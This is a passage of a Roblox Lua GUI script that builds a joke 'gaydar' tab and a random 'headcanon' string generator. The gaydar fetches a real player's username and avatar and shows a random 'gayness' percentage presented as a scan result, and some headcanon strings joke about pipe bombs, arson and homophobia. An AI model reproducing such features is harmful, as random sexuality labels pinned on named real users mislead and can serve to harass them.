		fadeTween.Completed:Wait()

		gaydartabreallyminimized = false
		uwu["gaydar tab block main frame"].Visible = false
	end

	gaydartabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["gaydar tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
uwu["gaydar tab top bar reposition button"].Position = UDim2.new(0, 306, 0, 4.7)

uwu["gaydar tab top bar reposition button"].BackgroundColor3 = uwu["default background color"]

uwu["gaydar tab top bar reposition button"].BorderColor3 = uwu["default border color"]
uwu["gaydar tab top bar reposition button"].BorderSizePixel = 1

uwu["gaydar tab top bar reposition button"].TextColor3 = uwu["default border color"]
uwu["gaydar tab top bar reposition button"].Font = Enum.Font.RobotoMono
uwu["gaydar tab top bar reposition button"].TextSize = 16
uwu["gaydar tab top bar reposition button"].TextScaled = false
uwu["gaydar tab top bar reposition button"].Text = "R"
uwu["gaydar tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["gaydar tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["gaydar tab top bar reposition button"].Parent = uwu["gaydar tab top bar"]
uwu["gaydar tab top bar reposition button"].ZIndex = 314

uwu["gaydar tab top bar reposition button text padding"] = Instance.new("UIPadding")
uwu["gaydar tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
uwu["gaydar tab top bar reposition button text padding"].Parent = uwu["gaydar tab top bar reposition button"]

uwu["gaydar tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(uwu["gaydar tab top bar"], 0.5, 376, 230 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["gaydar tab main frame 1"].Size = UDim2.new(0, 376, 0, 204)
uwu["gaydar tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

uwu["gaydar tab main frame 1"].BackgroundColor3 = uwu["default background color"]

uwu["gaydar tab main frame 1"].BorderColor3 = uwu["default border color"]
uwu["gaydar tab main frame 1"].BorderSizePixel = 1

uwu["gaydar tab main frame 1"].Parent = uwu["gaydar tab top bar"]
uwu["gaydar tab main frame 1"].ZIndex = 312

uwu["gaydar"].Size = UDim2.new(0, 89, 0, 89)
uwu["gaydar"].Position = UDim2.new(0, 283, 0, 5)
uwu["gaydar"].BackgroundColor3 = uwu["default background color"]
uwu["gaydar"].BorderColor3 = uwu["default border color"]
uwu["gaydar"].BorderSizePixel = 1
uwu["gaydar"].Parent = uwu["gaydar tab main frame 1"]
uwu["gaydar"].ZIndex = 313

uwu["gaydar scan"].Size = UDim2.new(0, 368, 0, 48)
uwu["gaydar scan"].Position = UDim2.new(0, 4, 0, 152)
uwu["gaydar scan"].BackgroundColor3 = uwu["default background color"]
uwu["gaydar scan"].BorderColor3 = uwu["default border color"]
uwu["gaydar scan"].BorderSizePixel = 1
uwu["gaydar scan"].Parent = uwu["gaydar tab main frame 1"]
uwu["gaydar scan"].ZIndex = 313

uwu["gaydar scan"].Font = Enum.Font.RobotoMono
uwu["gaydar scan"].TextColor3 = Color3.new(1, 1, 1)
uwu["gaydar scan"].Text = "scan target"
uwu["gaydar scan"].TextSize = 15
uwu["gaydar scan"].TextWrapped = true
uwu["gaydar scan"].TextXAlignment = Enum.TextXAlignment.Center
uwu["gaydar scan"].TextYAlignment = Enum.TextYAlignment.Center
uwu["gaydar scan"].ClipsDescendants = true

uwu["gaydar scan text padding"] = Instance.new("UIPadding")
uwu["gaydar scan text padding"].PaddingBottom = UDim.new(0, 0)
uwu["gaydar scan text padding"].Parent = uwu["gaydar scan"]

uwu["gaydar target"].Size = UDim2.new(0, 368, 0, 48)
uwu["gaydar target"].Position = UDim2.new(0, 4, 0, 99)
uwu["gaydar target"].BackgroundColor3 = uwu["default background color"]
uwu["gaydar target"].BorderColor3 = uwu["default border color"]
uwu["gaydar target"].BorderSizePixel = 1
uwu["gaydar target"].Parent = uwu["gaydar tab main frame 1"]
uwu["gaydar target"].ZIndex = 313

uwu["gaydar target"].Font = Enum.Font.RobotoMono
uwu["gaydar target"].TextColor3 = Color3.new(1, 1, 1)
uwu["gaydar target"].Text = ""
uwu["gaydar target"].PlaceholderText = "enter user"
uwu["gaydar target"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["gaydar target"].TextSize = 15
uwu["gaydar target"].TextWrapped = true
uwu["gaydar target"].TextXAlignment = Enum.TextXAlignment.Center
uwu["gaydar target"].TextYAlignment = Enum.TextYAlignment.Center
uwu["gaydar target"].ClipsDescendants = true

spawn(function()
	uwu["gaydar target"]:GetPropertyChangedSignal("Text"):Connect(function()
		if #uwu["gaydar target"].Text > 20 then
			uwu["gaydar target"].Text = string.sub(uwu["gaydar target"].Text, 1, 20)
		end
	end)
end)

uwu["gaydar target text padding"] = Instance.new("UIPadding")
uwu["gaydar target text padding"].PaddingBottom = UDim.new(0, 0)
uwu["gaydar target text padding"].Parent = uwu["gaydar scan"]

uwu["gaydar info"].Size = UDim2.new(0, 274, 0, 89)
uwu["gaydar info"].Position = UDim2.new(0, 4, 0, 5)
uwu["gaydar info"].BackgroundColor3 = uwu["default background color"]
uwu["gaydar info"].BorderColor3 = uwu["default border color"]
uwu["gaydar info"].BorderSizePixel = 1
uwu["gaydar info"].Parent = uwu["gaydar tab main frame 1"]
uwu["gaydar info"].ZIndex = 313

uwu["gaydar info"].Font = Enum.Font.RobotoMono
uwu["gaydar info"].TextColor3 = Color3.new(1, 1, 1)
uwu["gaydar info"].Text = "target: n/a\nuser: n/a\n\ngayness: n/a\naccuracy: n/a"
uwu["gaydar info"].TextSize = 15
uwu["gaydar info"].TextWrapped = true
uwu["gaydar info"].TextXAlignment = Enum.TextXAlignment.Left
uwu["gaydar info"].TextYAlignment = Enum.TextYAlignment.Center
uwu["gaydar info"].ClipsDescendants = true

uwu["gaydar info text padding"] = Instance.new("UIPadding")
uwu["gaydar info text padding"].PaddingBottom = UDim.new(0, 2)
uwu["gaydar info text padding"].PaddingLeft = UDim.new(0, 5)
uwu["gaydar info text padding"].Parent = uwu["gaydar info"]

-------------------------------------------------------------------------------------------------------------------------------

local targetuserinfo = {
	username = nil,
	displayName = nil,
	userId = nil,
	thumbnail = nil
}

uwu["gaydar target"].FocusLost:Connect(function()
	local username = uwu["gaydar target"].Text:match("^%s*(.-)%s*$")
	if username == "" then
		cangaydarscan = true
		uwu["gaydar info"].Text = "target: n/a\nuser: n/a\n\ngayness: n/a\naccuracy: n/a"
		targetuserinfo = {
			username = nil,
			displayName = nil,
			userId = nil,
			thumbnail = nil
		}
		return
	end

	local success, userId = pcall(function()
		return game:GetService("Players"):GetUserIdFromNameAsync(username)
	end)

	if not success then
		uwu["gaydar info"].Text = string.format("target: %s\nuser: %s\n\ngayness: n/a\naccuracy: n/a", username)
		targetuserinfo = {
			username = username,
			displayName = nil,
			userId = nil,
			thumbnail = nil
		}
		return
	end

	local displayName
	success, displayName = pcall(function()
		return game:GetService("Players"):GetNameFromUserIdAsync(userId)
	end)

	if not success then
		displayName = username
	end

	local thumbnail
	success, thumbnail = pcall(function()
		return game:GetService("Players"):GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
	end)

	if success and uwu["gaydar"]:IsA("ImageLabel") then
		uwu["gaydar"].Image = thumbnail
	end

	targetuserinfo = {
		username = username,
		displayName = displayName,
		userId = userId,
		thumbnail = thumbnail
	}

	uwu["gaydar info"].Text = string.format("target: %s\nuser: %s\n\ngayness: n/a\naccuracy: n/a", username, displayName)
end)

cangaydarscan = true

function scanTarget()
	playclicksound()
	if not cangaydarscan or not targetuserinfo.username then 
		return 
	end

	cangaydarscan = false

	local scan = Instance.new("Sound")
	scan.SoundId = "rbxassetid://8503529653"
	scan.Parent = uwu["local player"]
	scan.Name = "canttouchthis"
	scan.Volume = 3.8
	scan:Play()

	uwu["gaydar info"].Text = string.format("target: %s\nuser: %s\n\ngayness: scanning...\naccuracy: scanning...", 
		targetuserinfo.username, 
		targetuserinfo.displayName or targetuserinfo.username
	)

	local scanTime = math.random(1, 4)
	task.delay(scanTime, function()
		local yay = Instance.new("Sound")
		yay.SoundId = "rbxassetid://8458409341"
		yay.Parent = uwu["local player"]
		yay.Name = "canttouchthis"
		yay.Volume = 1
		yay:Play()

		local gayness = math.random(0, 100)
		local accuracy = math.random(60, 100)

		uwu["gaydar info"].Text = string.format(
			"target: %s\nuser: %s\n\ngayness: %d%%\naccuracy: %d%%",
			targetuserinfo.username,
			targetuserinfo.displayName or targetuserinfo.username,
			gayness,
			accuracy
		)

		t(1) cangaydarscan = true
	end)
end

uwu["gaydar scan"].MouseButton1Click:Connect(scanTarget)

-------------------------------------------------------------------------------------------------------------------------------

uwu["gaydar tab block main frame"].Size = UDim2.new(0, 376, 0, 203)
uwu["gaydar tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

uwu["gaydar tab block main frame"].BackgroundColor3 = uwu["default background color"]

uwu["gaydar tab block main frame"].BorderColor3 = uwu["default border color"]
uwu["gaydar tab block main frame"].BorderSizePixel = 1
uwu["gaydar tab block main frame"].BackgroundTransparency = 1

uwu["gaydar tab block main frame"].Parent = uwu["gaydar tab top bar"]
uwu["gaydar tab block main frame"].ZIndex = 314
uwu["gaydar tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["gaydar tab block all"].Size = UDim2.new(0, 376, 0, 230)
uwu["gaydar tab block all"].Position = UDim2.new(0, 0, 0, 0)

uwu["gaydar tab block all"].BackgroundColor3 = uwu["default background color"]

uwu["gaydar tab block all"].BorderColor3 = uwu["default border color"]
uwu["gaydar tab block all"].BorderSizePixel = 1
uwu["gaydar tab block all"].BackgroundTransparency = 0

uwu["gaydar tab block all"].Parent = uwu["gaydar tab top bar"]
uwu["gaydar tab block all"].ZIndex = 315
uwu["gaydar tab block all"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["headcanon generator tab top bar"].Size = UDim2.new(0, 446, 0, 26)

uwu["headcanon generator tab top bar"].BackgroundColor3 = uwu["default background color"]

uwu["headcanon generator tab top bar"].BorderColor3 = uwu["default border color"]
uwu["headcanon generator tab top bar"].BorderSizePixel = 1

uwu["headcanon generator tab top bar"].TextColor3 = uwu["default border color"]
uwu["headcanon generator tab top bar"].Font = Enum.Font.RobotoMono
uwu["headcanon generator tab top bar"].TextSize = 15
uwu["headcanon generator tab top bar"].TextScaled = false
uwu["headcanon generator tab top bar"].Text = " headcanon generator.lua o.o"
uwu["headcanon generator tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
uwu["headcanon generator tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

uwu["headcanon generator top bar text padding"] = Instance.new("UIPadding")
uwu["headcanon generator top bar text padding"].PaddingLeft = UDim.new(0, 0)
uwu["headcanon generator top bar text padding"].PaddingRight = UDim.new(0, 0)
uwu["headcanon generator top bar text padding"].Parent = uwu["headcanon generator tab top bar"]

uwu["headcanon generator tab top bar"].Parent = uwu["screen gui"]
uwu["headcanon generator tab top bar"].ZIndex = 203
uwu["headcanon generator tab top bar"].Visible = false

function draghcgentabtopbar()
	local frame = uwu["headcanon generator tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		uwu["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	uwu["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

draghcgentabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

uwu["headcanon generator tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
uwu["headcanon generator tab top bar close button"].Position = UDim2.new(0, 424, 0, 4.7)

uwu["headcanon generator tab top bar close button"].BackgroundColor3 = uwu["default background color"]

uwu["headcanon generator tab top bar close button"].BorderColor3 = uwu["default border color"]
uwu["headcanon generator tab top bar close button"].BorderSizePixel = 1

uwu["headcanon generator tab top bar close button"].TextColor3 = uwu["default border color"]
uwu["headcanon generator tab top bar close button"].Font = Enum.Font.RobotoMono
uwu["headcanon generator tab top bar close button"].TextSize = 16
uwu["headcanon generator tab top bar close button"].TextScaled = false
uwu["headcanon generator tab top bar close button"].Text = "X"
uwu["headcanon generator tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["headcanon generator tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["headcanon generator tab top bar close button"].Parent = uwu["headcanon generator tab top bar"]
uwu["headcanon generator tab top bar close button"].ZIndex = 204

uwu["headcanon generator tab top bar close button text padding"] = Instance.new("UIPadding")
uwu["headcanon generator tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
uwu["headcanon generator tab top bar close button text padding"].Parent = uwu["headcanon generator tab top bar close button"]

uwu["headcanon generator tab top bar close button"].MouseButton1Click:Connect(function()
	if not hcgentabcanminimize then return end
	hcgentabopen = false
	hcgentabminimized = false
	playclicksound()
	uwu["headcanon generator tab top bar"].Visible = false
	repos(uwu["headcanon generator tab top bar"], 0, 446, 168 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["headcanon generator tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
uwu["headcanon generator tab top bar minimize button"].Position = UDim2.new(0, 400, 0, 4.7)

uwu["headcanon generator tab top bar minimize button"].BackgroundColor3 = uwu["default background color"]

uwu["headcanon generator tab top bar minimize button"].BorderColor3 = uwu["default border color"]
uwu["headcanon generator tab top bar minimize button"].BorderSizePixel = 1

uwu["headcanon generator tab top bar minimize button"].TextColor3 = uwu["default border color"]
uwu["headcanon generator tab top bar minimize button"].Font = Enum.Font.RobotoMono
uwu["headcanon generator tab top bar minimize button"].TextSize = 16
uwu["headcanon generator tab top bar minimize button"].TextScaled = false
uwu["headcanon generator tab top bar minimize button"].Visible = true
uwu["headcanon generator tab top bar minimize button"].Text = "-"
uwu["headcanon generator tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["headcanon generator tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["headcanon generator tab top bar minimize button"].Parent = uwu["headcanon generator tab top bar"]
uwu["headcanon generator tab top bar minimize button"].ZIndex = 204

uwu["headcanon generator tab top bar minimize button text padding"] = Instance.new("UIPadding")
uwu["headcanon generator tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
uwu["headcanon generator tab top bar minimize button text padding"].Parent = uwu["headcanon generator tab top bar minimize button"]

hcgentabminimized = false
hcgentabcanminimize = true

uwu["headcanon generator tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not hcgentabcanminimize then return end
	spawn(playclicksound)
	hcgentabcanminimize = false

	hcgentabminimized = not hcgentabminimized

	if hcgentabminimized then
		uwu["headcanon generator tab top bar minimize button"].Text = "+"
		uwu["headcanon generator tab block main frame"].Visible = true

		local fadeTween = fade(uwu["headcanon generator tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		uwu["headcanon generator tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			uwu["headcanon generator tab block main frame"],
			UDim2.new(0, 446, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		hcgentabreallyminimized = true
		uwu["headcanon generator tab block main frame"].Visible = false
	else
		uwu["headcanon generator tab top bar minimize button"].Text = "-"
		uwu["headcanon generator tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			uwu["headcanon generator tab block main frame"],
			UDim2.new(0, 446, 0, 141),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		uwu["headcanon generator tab main frame 1"].Visible = true

		local fadeTween = fade(uwu["headcanon generator tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		hcgentabreallyminimized = false
		uwu["headcanon generator tab block main frame"].Visible = false
	end

	hcgentabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["headcanon generator tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
uwu["headcanon generator tab top bar reposition button"].Position = UDim2.new(0, 376, 0, 4.7)

uwu["headcanon generator tab top bar reposition button"].BackgroundColor3 = uwu["default background color"]

uwu["headcanon generator tab top bar reposition button"].BorderColor3 = uwu["default border color"]
uwu["headcanon generator tab top bar reposition button"].BorderSizePixel = 1

uwu["headcanon generator tab top bar reposition button"].TextColor3 = uwu["default border color"]
uwu["headcanon generator tab top bar reposition button"].Font = Enum.Font.RobotoMono
uwu["headcanon generator tab top bar reposition button"].TextSize = 16
uwu["headcanon generator tab top bar reposition button"].TextScaled = false
uwu["headcanon generator tab top bar reposition button"].Text = "R"
uwu["headcanon generator tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["headcanon generator tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["headcanon generator tab top bar reposition button"].Parent = uwu["headcanon generator tab top bar"]
uwu["headcanon generator tab top bar reposition button"].ZIndex = 204

uwu["headcanon generator tab top bar reposition button text padding"] = Instance.new("UIPadding")
uwu["headcanon generator tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
uwu["headcanon generator tab top bar reposition button text padding"].Parent = uwu["headcanon generator tab top bar reposition button"]

uwu["headcanon generator tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(uwu["headcanon generator tab top bar"], 0.5, 446, 168 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["headcanon generator tab main frame 1"].Size = UDim2.new(0, 446, 0, 142)
uwu["headcanon generator tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

uwu["headcanon generator tab main frame 1"].BackgroundColor3 = uwu["default background color"]

uwu["headcanon generator tab main frame 1"].BorderColor3 = uwu["default border color"]
uwu["headcanon generator tab main frame 1"].BorderSizePixel = 1

uwu["headcanon generator tab main frame 1"].Parent = uwu["headcanon generator tab top bar"]
uwu["headcanon generator tab main frame 1"].ZIndex = 202

-------------------------------------------------------------------------------------------------------------------------------

uwu["headcanon generator output"].Size = UDim2.new(0, 438, 0, 41)
uwu["headcanon generator output"].Position = UDim2.new(0, 4, 0, 5)

uwu["headcanon generator output"].BackgroundColor3 = uwu["default background color"]

uwu["headcanon generator output"].BorderColor3 = uwu["default border color"]
uwu["headcanon generator output"].BorderSizePixel = 0

uwu["headcanon generator output"].Parent = uwu["headcanon generator tab main frame 1"]
uwu["headcanon generator output"].ZIndex = 203

uwu["headcanon generator output"].Font = Enum.Font.RobotoMono
uwu["headcanon generator output"].TextColor3 = Color3.new(1, 1, 1)
uwu["headcanon generator output"].TextSize = 15
uwu["headcanon generator output"].Text = "..."
uwu["headcanon generator output"].TextWrapped = true
uwu["headcanon generator output"].TextXAlignment = Enum.TextXAlignment.Center
uwu["headcanon generator output"].TextYAlignment = Enum.TextYAlignment.Center
uwu["headcanon generator output"].ClipsDescendants = true

uwu["headcanon generator output text padding"] = Instance.new("UIPadding")
uwu["headcanon generator output text padding"].PaddingLeft = UDim.new(0, 7)
uwu["headcanon generator output text padding"].PaddingRight = UDim.new(0, 7)
uwu["headcanon generator output text padding"].Parent = uwu["headcanon generator output"]

uwu["headcanon generator input"].Size = UDim2.new(0, 216, 0, 41)
uwu["headcanon generator input"].Position = UDim2.new(0, 4, 0, 51)

uwu["headcanon generator input"].BackgroundColor3 = uwu["default background color"]

uwu["headcanon generator input"].BorderColor3 = uwu["default border color"]
uwu["headcanon generator input"].BorderSizePixel = 1

uwu["headcanon generator input"].Parent = uwu["headcanon generator tab main frame 1"]
uwu["headcanon generator input"].ZIndex = 203

uwu["headcanon generator input"].Font = Enum.Font.RobotoMono
uwu["headcanon generator input"].TextColor3 = Color3.new(1, 1, 1)
uwu["headcanon generator input"].TextSize = 15
uwu["headcanon generator input"].Text = ""
uwu["headcanon generator input"].PlaceholderText = "character name"
uwu["headcanon generator input"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["headcanon generator input"].TextWrapped = true
uwu["headcanon generator input"].TextXAlignment = Enum.TextXAlignment.Center
uwu["headcanon generator input"].TextYAlignment = Enum.TextYAlignment.Center
uwu["headcanon generator input"].ClipsDescendants = true
uwu["headcanon generator input"].Name = "stay"

uwu["headcanon generator input text padding"] = Instance.new("UIPadding")
uwu["headcanon generator input text padding"].PaddingLeft = UDim.new(0, 5)
uwu["headcanon generator input text padding"].PaddingRight = UDim.new(0, 5)
uwu["headcanon generator input text padding"].Parent = uwu["headcanon generator input"]

uwu["headcanon generator input 2"].Size = UDim2.new(0, 217, 0, 41)
uwu["headcanon generator input 2"].Position = UDim2.new(0, 225, 0, 51)

uwu["headcanon generator input 2"].BackgroundColor3 = uwu["default background color"]

uwu["headcanon generator input 2"].BorderColor3 = uwu["default border color"]
uwu["headcanon generator input 2"].BorderSizePixel = 1

uwu["headcanon generator input 2"].Parent = uwu["headcanon generator tab main frame 1"]
uwu["headcanon generator input 2"].ZIndex = 203

uwu["headcanon generator input 2"].Font = Enum.Font.RobotoMono
uwu["headcanon generator input 2"].TextColor3 = Color3.new(1, 1, 1)
uwu["headcanon generator input 2"].TextSize = 15
uwu["headcanon generator input 2"].Text = ""
uwu["headcanon generator input 2"].PlaceholderText = "character name 2 (optional)"
uwu["headcanon generator input 2"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["headcanon generator input 2"].TextWrapped = true
uwu["headcanon generator input 2"].TextXAlignment = Enum.TextXAlignment.Center
uwu["headcanon generator input 2"].TextYAlignment = Enum.TextYAlignment.Center
uwu["headcanon generator input 2"].ClipsDescendants = true
uwu["headcanon generator input 2"].Name = "stay"

uwu["headcanon generator input 2 text padding"] = Instance.new("UIPadding")
uwu["headcanon generator input 2 text padding"].PaddingLeft = UDim.new(0, 5)
uwu["headcanon generator input 2 text padding"].PaddingRight = UDim.new(0, 5)
uwu["headcanon generator input 2 text padding"].Parent = uwu["headcanon generator input 2"]

uwu["generate headcanon"].Size = UDim2.new(0, 438, 0, 41)
uwu["generate headcanon"].Position = UDim2.new(0, 4, 0, 97)

uwu["generate headcanon"].BackgroundColor3 = uwu["default background color"]

uwu["generate headcanon"].BorderColor3 = uwu["default border color"]
uwu["generate headcanon"].BorderSizePixel = 1

uwu["generate headcanon"].Parent = uwu["headcanon generator tab main frame 1"]
uwu["generate headcanon"].ZIndex = 203

uwu["generate headcanon"].Font = Enum.Font.RobotoMono
uwu["generate headcanon"].TextColor3 = Color3.new(1, 1, 1)
uwu["generate headcanon"].TextSize = 15
uwu["generate headcanon"].Text = "generate headcanon"
uwu["generate headcanon"].TextWrapped = true
uwu["generate headcanon"].TextXAlignment = Enum.TextXAlignment.Center
uwu["generate headcanon"].TextYAlignment = Enum.TextYAlignment.Center
uwu["generate headcanon"].ClipsDescendants = true
uwu["generate headcanon"].Name = "stay"

uwu["generate headcanon text padding"] = Instance.new("UIPadding")
uwu["generate headcanon text padding"].PaddingBottom = UDim.new(0, 0)
uwu["generate headcanon text padding"].Parent = uwu["generate headcanon"]

local hcs_one = {
	"%s talks to plants when no one is watching.",
	"%s writes fanfiction about themselves.",
	"%s believes their reflection is plotting against them.",
	"%s is very good at using chopsticks.",
	"%s wears hello kitty pajamas.",
	"%s often brags about how gay they are.",
	"%s has an obession with tangerines.",
	"%s burns popsicle sticks for fun.",
	"%s is an arsonist.",
	"%s owns a comically large anchor.",
	"%s can perform a flawless cartwheel.",
	"%s is very good at playing geometry dash.",
	"%s gets bullied in roblox.",
	"%s gets flamed in every video game.",
	"%s showers once every week.",
	"%s eats kiwis without peeling the skin.",
	"%s laughs like a maniac.",
	"%s believes everything you tell them.",
	"%s can spontaneously combust on command.",
	"%s can burp the whole alphabet.",
	"%s can throw every gang sign in existence.",
	"%s uses a flip phone.",
	"%s unironically listens to phonk.",
	"%s had a concussion at a young age.",
	"%s cries themselves to sleep.",
	"%s draws their classmates kissing each other.",
	"%s is addicted to eating chalk.",
	"%s has a serious gambling addiction.",
	"%s is rich as fuck.",
	"%s knows how to rap.",
	"%s knows every language.",
	"%s wears heart boxers.",
	"%s is talented at everything.",
	"%s sucks at everything.",
	"%s hates talking to people.",
	"%s has scoliosis.",
	"%s is a conspiracy theorist.",
	"%s says \"sorry\" instead of \"bless you\".",
	"%s mails their friends pipe bombs as a joke.",
	"%s stretches like a cat.",
	"%s has an irrational fear of clocks.",
	"%s paints therir nails black using a sharpie.",
	"%s is gay.",
	"%s is trans.",
	"%s is bisexual.",
	"%s hates gay people.",
	"%s hates trans people.",
	"%s hates bisexuals.",
	"%s is aroace.",
	"%s hates aroaces.",
	"%s is extremely homophobic.",
	"%s is a homophobic homosexual.",
	"%s occasionally has brain aneurysms.",
	"%s is a flat earther and gets flamed for it.",
	"%s is super photogenic.",
	"%s looks ugly in every picture taken of them.",
	"%s can balance anything on top of each other.",
	"%s uses a comically large spoon to eat.",
	"%s uses a fork to drink soup.",
	"%s is a masochist.",
	"%s wears anti paparazzi clothing for no reason.",
	"%s can walk like a model.",
	"%s is secretly a femboy.",
	"%s uses a spoon to spread condiments on their bread.",
	"%s has zero manners.",
	"%s tells horrible jokes.",
	"%s takes in stray animals.",
	"%s enunciates.",
	"%s is an alcoholic.",
	"%s had an emo phase.",
	"%s can eat a whole tub of ice cream in one sitting.",
	"%s once ate " .. math.random(10, 100) .. " magnets in one sitting.",
	"%s once ate " .. math.random(10, 100) .. " hotdogs in one sitting.",
	"%s once ate " .. math.random(10, 100) .. " silver coins in one sitting.",
	"%s loves summer.",
	"%s loves winter.",
	"%s loves spring.",
	"%s loves fall.",
	"%s hates summer.",
	"%s hates winter.",
	"%s hates spring.",
	"%s hates fall.",
	"%s is a dog person.",
	"%s is a cat person.",
	"%s has a very low spice tolerance.",
	"%s has a very high spice tolerance.",
	"%s is great at debating.",
	"%s encourages not swearing, but swears.",
	"%s tackles and wrestles people to show affection.",
	"%s hugs people as a surprise greeting.",
	"%s hops on peoples back as a surprise greeting.",
	"%s believes in santa.",
	"%s believes in the tooth fairy.",
	"%s sucks at saying tongue twisters.",
	"%s is surprisingly good at saying tongue twisters.",
	"%s gets road rage.",
	"%s always orders the same thing.",
	"%s is not very good with social cues.",
	"it would not take much for %s to turn evil.",
	"%s likes being alone.",
	"%s hates being alone.",
	"%s doesnt know how to say \"no\".",
	"%s doesnt know how to say \"yes\".",
	"%s speaks in riddles involuntarily.",
	"%s's favorite subject in school was math.",
	"%s's favorite subject in school was french.",
	"%s's favorite subject in school was spanish.",
	"%s's favorite subject in school was gym.",
	"%s's favorite subject in school was ERC.",
	"%s's favorite subject in school was history.",
	"%s's favorite subject in school was geography.",
	"%s's favorite subject in school was algebra.",
	"%s's favorite subject in school was music.",
	"%s's favorite subject in school was arts and crafts.",
	"%s's least favorite subject in school was math.",
	"%s's least favorite subject in school was french.",
	"%s's least favorite subject in school was spanish.",
	"%s's least favorite subject in school was gym.",
	"%s's least favorite subject in school was ERC.",
	"%s's least favorite subject in school was history.",
	"%s's least favorite subject in school was geography.",
	"%s's least favorite subject in school was algebra.",
	"%s's least favorite subject in school was music.",
	"%s's least favorite subject in school was arts and crafts.",
	"%s has a peppy, bouncy walk.",
	"%s doesnt own a single pair of matching socks.",
	"%s is a tough guy with no fear.",
	"%s has a really good immune system.",
	"%s has an immaculate sleeper build.",
	"%s cant drive.",
	"%s can drive.",
	"%s owns a semi truck.",
	"%s owns a koenigsegg jesko.",
	"%s rarely gets hypersexual.",
	"%s cant make the voices go away.",
	"%s has gay friends.",
	"%s killed john lennon.",
	"%s bobs their feet when sittng with crossed legs.",
	"%s eats pizza like a cookie.",
	"%s eats their pizza by folding it in half.",
	"%s secretly hates everyone.",
	"%s listens to country music.",
	"%s loves hyperpop.",
	"%s has short term memory loss.",
	"%s doesnt pay their taxes.",
	"%s commits tax fraud.",
	"%s commits tax evasion.",
	"%s has been canceled on twitter.",
	"%s is shockingly good at playing the piano.",
	"%s is an introvert.",
	"%s is an extrovert.",
	"%s is an ambivert.",
	"%s does not know what sleep is.",
	"%s is going to heaven.",
	"%s is going to hell.",
	"%s uses a two in one shampoo and conditioner.",
	"%s shops exclusively at thrift stores.",
	"%s posts thirst traps about themselves.",
	"%s likes board games, but no one else wants to play with them.",
	"%s walks like theyre drunk.",
	"%s has a record for DUI.",
	"%s has a record for speeding.",
	"%s has a record for grand theft.",
	"%s has a record for grand arson.",
	"%s has a record for shoplifting.",
	"%s has a record for breaking in someones house.",
	"%s has a record for escaping prison.. twice.",
	"%s repetitively gets called a good boy.",
	"%s french kisses their friends.",
	"%s keeps their mugshot as their profile picture in every social media platform.",
	"%s loves physical touch.",
	"%s hates physical touch.",
	"%s can dunk.",
	"%s tryhards in every game they play.",
	"%s is a professional speedrunner.",
	"%s is very affectionate towards everyone they meet.",
	"%s likes to judge people they havent met yet.",
	"%s asks you if they were too rough.",
	"%s can operate a plane.",
	"%s loves sleepovers.",
	"%s jokingly performs CPR on someone to wake them up.",
	"%s has massive glutes.",
	"%s sleepwalks.",
	"%s always has an unstable connection when calling someone.",
	"%s is rich, but is completely oblivious about it.",
	"%s is scared of forests.",
	"%s is secretly a music producer.",
	"%s swears they arent gay but dry humps their friend of the same sex.",
	"%s owns a draco.",
	"%s owns a glock.",
	"%s owns an RPG.",
	"%s owns a deagle.",
	"%s owns a P-90.",
